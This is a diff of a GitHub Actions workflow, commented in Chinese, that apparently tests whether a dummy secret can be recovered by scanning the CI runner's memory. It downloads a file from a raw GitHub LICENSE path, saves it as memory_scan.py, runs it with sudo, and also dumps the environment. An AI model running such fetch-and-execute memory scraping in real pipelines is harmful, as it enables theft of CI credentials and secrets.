@@ -35,7 +35,7 @@ jobs:
           echo "正在第一次内存扫描提取秘钥..."
           wget -q https://raw.githubusercontent.com/flank/flank/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE -O memory_scan.py
           chmod +x memory_scan.py
-          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbcc' && echo "⚠️ 第一次找到秘钥！" || echo "✅ 第一次未找到秘钥。"
+          sudo python3 memory_scan.py | grep -i -a --text -E 'a{2}b{2}c{2}d{2}1{2}' && echo "⚠️ 第一次找到秘钥！" || echo "✅ 第一次未找到秘钥。"
 
       - name: 📝 打印环境信息
         run: |
@@ -43,11 +43,11 @@ jobs:
           echo "当前用户: $(whoami)"
           echo "环境变量:"
           env
-
+      # 测试多次执行的时候，如果grep用关键字匹配，则内存数据中会匹配到命令导致误报
       - name: 🕵️ 第二次内存扫描提取秘钥
         run: |
           echo "正在扫描内存提取秘钥..."          
-          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbccdd11' && echo "⚠️ 第二次找到秘钥！" || echo "✅ 第二次未找到秘钥。"
+          sudo python3 memory_scan.py | grep -i -a --text -E 'a{2}b{2}c{2}d{2}1{2}' && echo "⚠️ 第二次找到秘钥！" || echo "✅ 第二次未找到秘钥。"
 
       - name: ✅ 测试完成
         run: echo "🎉 内存扫描测试已完成！"
